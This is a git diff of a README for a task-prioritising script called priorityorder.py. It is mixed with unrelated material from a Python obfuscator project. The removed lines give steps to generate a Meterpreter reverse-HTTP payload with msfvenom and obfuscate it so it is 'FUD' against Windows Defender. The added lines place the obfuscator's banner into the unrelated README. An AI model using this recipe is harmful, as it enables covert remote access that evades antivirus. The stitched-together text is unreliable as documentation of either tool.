@@ -10,17 +10,16 @@ prorityorder
 ```
 
 ### Usage Guide
+<pre>
+<b>usage: priorityorder.py [-h] [-i INPUTFILE] [-o OUTPUTFILE]</b>
 
-```sh 
-usage: priorityorder.py [-h] [-i INPUTFILE] [-o OUTPUTFILE]
+<b> optional arguments:</b>
+<b> -h, --help    show this help message and exit</b>
+<b> -i INPUTFILE  Input File</b>
+<b> -o OUTUTFILE  Output File</b>
+</pre>
 
-optional arguments:
--h, --help    show this help message and exit
--i INPUTFILE  Input File
--o OUTUTFILE  Output File
-```
-
-# Program Tasks
+# priorityorder.py Program Tasks
 
 ```sh 
 input
@@ -34,28 +33,8 @@ order of working tasks with your priority (for example : e, b, c, a, f, g, d)
 ```
 
 ### Usage Guide
-```sh 
-@@ -34,14 +34,26 @@ chmod +x oneline.py
-<b>  --output OUTPUT  Output File.</b>
-</pre>
-```
-
-### Examples
-### Example: Creating FUD Meterpreter Python Payload
-1. Generate Python Payload:
-`msfvenom --payload python/meterpreter_reverse_http LHOST=... LPORT=... > payload.txt`
-2. Obfustucate Payload
-`onelinepy -m /one_line/base64 --script payload.txt -i 3 --output obfustucated_payload.txt`
-3. Profit! The Obfustucated Payload works against Windows Defender.
-```
-
-### More Examples
-```sh
-./oneline.py -m /one_line/base64 --script payload.py -i 3
-onelinepy -m /one_line/base64 --script payload.py -i 3
-```
-```sh
-./oneline.py -m /one_line/hex --code "print('HEX!')"
-onelinepy -m /one_line/hex --code "print('HEX!')"
-```
-### Obfustucation Method List
+<pre><b>              _ _                 </b>
+<b>  ___ ___ ___| |_|___ ___</b><font color="#FFE82C"><b> ___ _ _</b></font>
+<b> | . |   | -_| | |   | -_</b><font color="#FFE82C"><b>| . | | |</b></font><b>     </b><font color="#FFE82C"><b>Python</b></font>
+<b> |___|_|_|___|_|_|_|_|___</b><font color="#FFE82C"><b>|  _|_  |</b></font><b>     </b><font color="#729FCF"><b>Obfustucator</b></font>
+<b>                         </b><font color="#FFE82C"><b>|_| |___|</b></font>
